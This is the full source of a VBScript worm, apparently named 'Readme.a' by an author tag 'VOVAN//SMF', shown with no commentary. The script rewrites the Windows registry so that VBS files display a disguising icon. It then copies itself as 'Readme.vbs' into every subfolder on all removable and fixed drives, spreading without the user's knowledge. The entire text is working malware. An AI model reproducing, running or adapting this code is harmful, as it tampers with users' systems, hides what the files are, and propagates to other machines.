'VOVAN//SMF Readme.a
Set A=CreateObject("Scripting.FileSystemObject")
Set B=CreateObject("WScript.Shell")
B.RegWrite "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon","shell32.dll,-152"
Set C=A.Drives
For Each Drive In C
If Drive.DriveType=2 Or Drive.DriveType=3 Then Onward Drive.Path &"\"
Next
Function Onward(D)
Set E=A.GetFolder(D)
Set F=E.SubFolders
For Each G In F
A.CopyFile Wscript.ScriptFullName, G&"\Readme.vbs"
Onward(G)
Next
End Function